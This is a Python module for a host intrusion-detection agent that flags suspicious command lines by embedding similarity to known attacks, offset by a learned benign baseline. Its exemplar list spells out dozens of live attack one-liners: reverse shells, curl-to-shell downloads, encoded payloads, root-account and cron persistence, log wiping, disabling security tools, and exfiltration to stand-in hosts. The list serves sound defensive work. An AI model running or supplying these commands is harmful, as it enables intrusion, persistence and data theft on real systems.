"""Layer 2: similarity detection over command lines and paths.

The rule engine matches patterns an analyst wrote down. That is precise and
completely blind to anything nobody has written down yet - change `bash -i`
to `bash --init-file`, pad the argument, swap the encoder, and a regex that
took an afternoon to write stops firing.

This module asks a different question: not "does this match a known signature"
but "how close is this to something known bad, and how far is it from what
this host normally runs". Both halves matter. Similarity to a malicious
exemplar alone produces false positives on administrative work that genuinely
resembles an attack, because at the level of a command line, administration and
intrusion look alike. The margin between the two distances is the signal.

    encode(cmdline) ──▶ ┌ nearest malicious exemplar ─┐
                        │                             ├─▶ margin ─▶ detection
                        └ nearest local-benign vector ┘

Two encoders, chosen at startup by what is installed:

  TransformerEncoder   sentence-transformers with a pretrained MiniLM. Real
                       sentence embeddings, understands that "download and
                       execute" and "fetch then run" are the same idea.
                       ~90 MB, CPU inference, a few ms per string.

  HashedNGramEncoder   character 3-5 grams hashed into a fixed space. No
                       dependencies beyond the standard library, no model
                       download, and honest about what it is: fuzzy string
                       matching, not comprehension. It catches obfuscation
                       variants of known commands, which is most of the value,
                       and misses genuinely novel phrasing, which is the cost.

The fallback is not a placeholder. A detection agent that refuses to start
because a model file is missing is a detection agent that is not running.
"""

from __future__ import annotations

import hashlib
import math
import re
import threading
import time
from collections import deque

from ..models import Detection

# ── exemplars ────────────────────────────────────────────────────────────
# Curated command-line shapes, tagged with the technique they represent. These
# are training data, not rules: nothing here is matched literally, it is
# encoded and compared. Add to this list to extend coverage without writing an
# expression, which is the point of having this layer at all.

MALICIOUS_EXEMPLARS: list[tuple[str, str, str]] = [
    # (exemplar, technique, short label)
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "T1059", "reverse shell via bash tcp device"),
    ("sh -c 'exec 5<>/dev/tcp/attacker/443; cat <&5 | sh >&5 2>&5'", "T1059", "reverse shell fd juggling"),
    ("nc -e /bin/sh 192.168.1.5 9001", "T1059", "netcat reverse shell"),
    ("ncat --ssl attacker.net 443 -e /bin/bash", "T1059", "encrypted netcat shell"),
    ("python -c 'import socket,os,pty;s=socket.socket();s.connect((\"h\",9));"
     "os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'", "T1059", "python reverse shell"),
    ("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "connect(S,sockaddr_in(4444,inet_aton(\"h\")));exec(\"/bin/sh -i\")'", "T1059", "perl reverse shell"),
    ("php -r '$s=fsockopen(\"h\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "T1059", "php reverse shell"),
    ("socat TCP:attacker:4444 EXEC:/bin/bash,pty,stderr", "T1059", "socat shell"),
    ("exec 9<>/dev/tcp/h/443; sh <&9 >&9 2>&9", "T1059", "bare fd reverse shell"),
    ("0<&196;exec 196<>/dev/tcp/h/4444; sh <&196 >&196 2>&196", "T1059", "fd reverse shell"),
    ("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc h 4444 >/tmp/f", "T1059", "fifo reverse shell"),

    ("curl -fsSL http://185.100.1.1/a.sh | bash", "T1105", "pipe remote script to shell"),
    ("wget -qO- http://bad.host/x | sh", "T1105", "pipe download to shell"),
    ("curl -o /tmp/.x http://h/x && chmod +x /tmp/.x && /tmp/.x", "T1105", "download, chmod, execute"),
    ("python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://h/p').read())\"",
     "T1105", "fetch and exec in interpreter"),

    ("echo cm0gLXJmIC8= | base64 -d | sh", "T1027", "base64 decoded to shell"),
    ("echo <b64> | base64 --decode | bash", "T1027", "base64 decoded to shell"),
    ("wget -q -O - http://h/p.sh | /bin/sh", "T1105", "wget piped to shell"),
    ("bash -c \"$(echo -e '\\x63\\x75\\x72\\x6c')\"", "T1027", "hex escaped command"),
    ("eval $(printf '\\143\\165\\162\\154')", "T1027", "octal escaped eval"),
    ("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A", "T1027", "encoded powershell"),

    ("useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcupdate", "T1136", "uid 0 account created"),
    ("echo 'x::0:0::/root:/bin/sh' >> /etc/passwd", "T1136", "append root user to passwd"),
    ("echo 'ssh-rsa AAAAB3N...' >> ~/.ssh/authorized_keys", "T1098", "append ssh key"),
    ("usermod -aG sudo compromised", "T1098", "add account to sudo group"),

    ("(crontab -l; echo '*/5 * * * * curl h|sh') | crontab -", "T1053", "append cron entry"),
    ("echo '* * * * * root /tmp/.x' > /etc/cron.d/update", "T1053", "drop cron file"),
    ("systemctl enable --now /tmp/backdoor.service", "T1543", "enable unit from tmp"),

    ("history -c && rm -f ~/.bash_history && > /var/log/auth.log", "T1070", "clear history and logs"),
    ("shred -u /var/log/secure", "T1070", "destroy log file"),
    ("touch -r /bin/ls /tmp/.x", "T1070", "timestomp against system binary"),

    ("systemctl stop auditd && setenforce 0", "T1562", "disable audit and selinux"),
    ("iptables -F && iptables -P INPUT ACCEPT", "T1562", "flush firewall rules"),
    ("pkill -f osquery; pkill -f falcon", "T1562", "kill security agents"),

    ("find / -perm -4000 -type f 2>/dev/null", "T1548", "suid enumeration"),
    ("sudo -l 2>/dev/null", "T1548", "sudo rights enumeration"),
    ("getcap -r / 2>/dev/null", "T1548", "capability enumeration"),

    ("nmap -sS -p- 10.0.0.0/24", "T1046", "subnet port scan"),
    ("for p in $(seq 1 65535); do (echo >/dev/tcp/10.0.0.5/$p) 2>/dev/null && echo $p; done",
     "T1046", "bash builtin port scan"),

    ("xmrig -o pool.minexmr.com:443 -u 4A... --donate-level 1", "T1496", "cryptominer"),
    ("./kdevtmpfsi -c config.json", "T1496", "disguised miner binary"),

    ("tar czf - /var/lib/data | curl -T - http://h/u", "T1041", "archive and upload"),
    ("mysqldump --all-databases | gzip | nc attacker 443", "T1041", "database exfiltration"),

    ("gdb -p 1234 -batch -ex 'call system(\"/bin/sh\")'", "T1055", "gdb process injection"),
    ("echo '/tmp/.so' > /etc/ld.so.preload", "T1546", "ld.so.preload backdoor"),
    ("cp /bin/bash /tmp/[kworker/0:1] && chmod +s /tmp/*", "T1036", "masquerade as kernel thread"),
]

_WS = re.compile(r"\s+")
# No word boundary: the digits worth collapsing are usually *inside* an
# identifier - /tmp/x9281, sess4417, port numbers glued to a host. Requiring a
# boundary meant two runs of one attack normalised to different strings, which
# silently defeated both the similarity score and the adjudication cache.
_NUM = re.compile(r"\d{2,}")
_HEXISH = re.compile(r"\b[0-9a-f]{12,}\b", re.I)


def normalise(text: str) -> str:
    """Strip the parts that vary between runs of the same command.

    Ports, pids, hashes and IP octets change every execution; leaving them in
    means two invocations of one attack look like two different things, which
    wrecks both the similarity score and the verdict cache downstream.
    """
    t = (text or "").strip().lower()
    t = _HEXISH.sub("<hex>", t)
    t = _NUM.sub("<n>", t)
    return _WS.sub(" ", t)[:512]


# ── encoders ─────────────────────────────────────────────────────────────

class HashedNGramEncoder:
    """Character n-grams hashed into a fixed vector. Standard library only."""

    name = "hashed-ngram"
    dims = 4096

    def __init__(self, dims: int = 4096, ngram_range: tuple[int, int] = (3, 5)):
        self.dims = dims
        self.lo, self.hi = ngram_range
        self.model_id = f"hashed-ngram-{self.lo}{self.hi}-{dims}"

    def encode(self, text: str) -> list[float]:
        vec = [0.0] * self.dims
        t = f" {text} "
        for n in range(self.lo, self.hi + 1):
            for i in range(max(0, len(t) - n + 1)):
                gram = t[i:i + n]
                h = int.from_bytes(hashlib.blake2b(gram.encode(), digest_size=5).digest(), "big")
                # signed hashing keeps collisions from systematically inflating
                vec[h % self.dims] += 1.0 if (h >> 20) & 1 else -1.0
        norm = math.sqrt(sum(v * v for v in vec)) or 1.0
        return [v / norm for v in vec]

    def encode_many(self, texts: list[str]) -> list[list[float]]:
        return [self.encode(t) for t in texts]


class TransformerEncoder:
    """Pretrained sentence-transformer. Real embeddings, optional dependency."""

    name = "transformer"

    def __init__(self, model_name: str = "sentence-transformers/all-MiniLM-L6-v2"):
        from sentence_transformers import SentenceTransformer     # noqa: PLC0415
        self._model = SentenceTransformer(model_name)
        self.dims = self._model.get_sentence_embedding_dimension()
        self.model_id = model_name

    def encode(self, text: str) -> list[float]:
        return self.encode_many([text])[0]

    def encode_many(self, texts: list[str]) -> list[list[float]]:
        vecs = self._model.encode(texts, normalize_embeddings=True,
                                  show_progress_bar=False, convert_to_numpy=True)
        return [v.tolist() for v in vecs]


def build_encoder(prefer: str = "auto") -> tuple[object, str]:
    """Return an encoder and a one-line note about why this one."""
    if prefer in ("auto", "transformer"):
        try:
            enc = TransformerEncoder()
            return enc, f"pretrained sentence embeddings ({enc.model_id})"
        except Exception as exc:
            if prefer == "transformer":
                note = (f"transformer encoder requested but unavailable ({type(exc).__name__}); "
                        f"fell back to hashed n-grams")
            else:
                note = ("sentence-transformers not installed; using hashed character n-grams. "
                        "pip install sentence-transformers for semantic matching")
            return HashedNGramEncoder(), note
    return HashedNGramEncoder(), "hashed character n-grams (configured)"


def cosine(a: list[float], b: list[float]) -> float:
    return sum(x * y for x, y in zip(a, b))          # both sides are L2-normalised


# ── benign memory ────────────────────────────────────────────────────────

class BenignMemory:
    """What this host normally runs, learned rather than configured.

    Deliberately conservative about what it admits. A command line only becomes
    benign evidence if it was seen repeatedly and never contributed to a
    detection - otherwise an attacker who lands early and runs their tooling
    steadily would teach the agent that their tooling is normal, which is the
    classic poisoning attack against unsupervised baselining.
    """

    def __init__(self, capacity: int = 400, admit_after: int = 3):
        self.capacity = capacity
        self.admit_after = admit_after
        self.sightings: dict[str, int] = {}
        self.vectors: deque[tuple[str, list[float]]] = deque(maxlen=capacity)
        self.tainted: set[str] = set()
        self._known: set[str] = set()

    def observe(self, key: str, encode) -> None:
        if key in self.tainted or key in self._known:
            return
        n = self.sightings.get(key, 0) + 1
        self.sightings[key] = n
        if n >= self.admit_after:
            self.vectors.append((key, encode(key)))
            self._known.add(key)
            self.sightings.pop(key, None)
        if len(self.sightings) > self.capacity * 4:       # bound the counter table
            self.sightings = dict(list(self.sightings.items())[-self.capacity * 2:])

    def taint(self, key: str) -> None:
        """Called when something we had treated as normal turns out not to be."""
        self.tainted.add(key)
        self._known.discard(key)
        self.vectors = deque(((k, v) for k, v in self.vectors if k != key),
                             maxlen=self.capacity)

    def nearest(self, vec: list[float]) -> float:
        return max((cosine(vec, v) for _, v in self.vectors), default=0.0)

    def __len__(self) -> int:
        return len(self.vectors)


# ── detector ─────────────────────────────────────────────────────────────

class SimilarityDetector:
    def __init__(self, enabled: bool = True, encoder_pref: str = "auto",
                 threshold: float = 0.38, margin: float = 0.16,
                 benign_capacity: int = 400):
        self.enabled = enabled
        self.threshold = threshold      # similarity to a malicious exemplar
        self.margin = margin            # how far it must beat local-normal by
        self.encoder = None
        self.note = "disabled"
        self.exemplars: list[tuple[str, str, str, list[float]]] = []
        self.benign = BenignMemory(benign_capacity)
        self.scored = 0
        self.fired = 0
        self.skipped_known = 0
        self._lock = threading.Lock()
        self._ready = False
        self._seen_recently: dict[str, float] = {}

        if enabled:
            # Loading a transformer takes seconds, so warm it off the hot path.
            threading.Thread(target=self._warm, args=(encoder_pref,),
                             name="semantic-warmup", daemon=True).start()

    def _warm(self, pref: str) -> None:
        encoder, note = build_encoder(pref)
        texts = [normalise(e[0]) for e in MALICIOUS_EXEMPLARS]
        vecs = encoder.encode_many(texts)
        with self._lock:
            self.encoder = encoder
            self.note = note
            self.exemplars = [(t, e[1], e[2], v)
                              for t, e, v in zip(texts, MALICIOUS_EXEMPLARS, vecs)]
            self._ready = True

    @property
    def ready(self) -> bool:
        return self._ready

    def add_exemplar(self, text: str, technique: str, label: str) -> bool:
        """Extend coverage at runtime from a confirmed incident."""
        if not self._ready:
            return False
        key = normalise(text)
        with self._lock:
            if any(k == key for k, _, _, _ in self.exemplars):
                return False
            self.exemplars.append((key, technique, label, self.encoder.encode(key)))
        self.benign.taint(key)
        return True

    def score_text(self, text: str) -> dict | None:
        """Raw scoring, exposed so the assistant and tests can ask directly."""
        if not self._ready or not text:
            return None
        key = normalise(text)
        if len(key) < 8:
            return None
        with self._lock:
            encoder, exemplars = self.encoder, list(self.exemplars)
        vec = encoder.encode(key)
        sim, technique, label, matched = 0.0, "", "", ""
        for ek, tech, lbl, ev in exemplars:
            s = cosine(vec, ev)
            if s > sim:
                sim, technique, label, matched = s, tech, lbl, ek
        near_benign = self.benign.nearest(vec)
        return {"normalised": key, "similarity": round(sim, 3),
                "closest_known_attack": label, "technique": technique,
                "matched_exemplar": matched[:160],
                "similarity_to_host_normal": round(near_benign, 3),
                "margin": round(sim - near_benign, 3), "vector": vec}

    def evaluate(self, entity: str, text: str, extra: dict | None = None) -> Detection | None:
        if not self._ready:
            return None
        result = self.score_text(text)
        if result is None:
            return None
        self.scored += 1
        vec = result.pop("vector")
        key = result["normalised"]

        fires = (result["similarity"] >= self.threshold
                 and result["margin"] >= self.margin)

        if not fires:
            # Only material that did not look like an attack is allowed to
            # become part of this host's definition of normal.
            if result["similarity"] < self.threshold * 0.75:
                self.benign.observe(key, lambda k: vec)
            return None

        # Collapse repeats of the same normalised command inside a short window.
        now = time.time()
        if now - self._seen_recently.get(key, 0.0) < 120:
            self.skipped_known += 1
            return None
        self._seen_recently[key] = now
        if len(self._seen_recently) > 2000:
            self._seen_recently = {k: v for k, v in self._seen_recently.items()
                                   if now - v < 600}

        self.fired += 1
        # Confidence rises with both absolute similarity and the margin over
        # normal, and is capped well below certainty: this layer is a strong
        # lead generator and a poor sole witness.
        # The margin carries more information than raw similarity, and measurably
        # so: across the calibration set, benign look-alikes separate from real
        # attack variants far more cleanly on margin than on similarity. Weight
        # accordingly rather than treating the two as equals.
        conf = min(0.80, 0.38 + 0.42 * result["margin"]
                   + 0.30 * (result["similarity"] - self.threshold))
        score = min(86.0, 40.0 + 34.0 * result["margin"]
                    + 52.0 * (result["similarity"] - self.threshold))

        evidence = {**(extra or {}), **result, "encoder": self.encoder.model_id,
                    "host_normal_samples": len(self.benign)}
        return Detection(
            rule_id=f"SIM-{result['technique'] or 'UNKNOWN'}",
            title=f"Command resembles a known {result['closest_known_attack']}",
            score=round(score, 1), confidence=round(conf, 2), source="semantic",
            entity=entity, category="process",
            mitre=[result["technique"]] if result["technique"] else [],
            evidence=evidence,
            remediation=(
                "This did not match a written rule; it was scored by similarity to known "
                "attack tooling and by how unlike this host's normal workload it is. Read "
                "the full command line before acting - administrative work sometimes lands "
                "here legitimately, and if it does, that command becomes part of the host "
                "baseline once it has been seen a few times."),
        )

    def status(self) -> dict:
        return {
            "enabled": self.enabled, "ready": self._ready,
            "encoder": getattr(self.encoder, "model_id", None),
            "encoder_note": self.note,
            "dimensions": getattr(self.encoder, "dims", None),
            "exemplars": len(self.exemplars),
            "host_normal_samples": len(self.benign),
            "tainted": len(self.benign.tainted),
            "scored": self.scored, "fired": self.fired,
            "repeats_collapsed": self.skipped_known,
            "threshold": self.threshold, "margin": self.margin,
        }
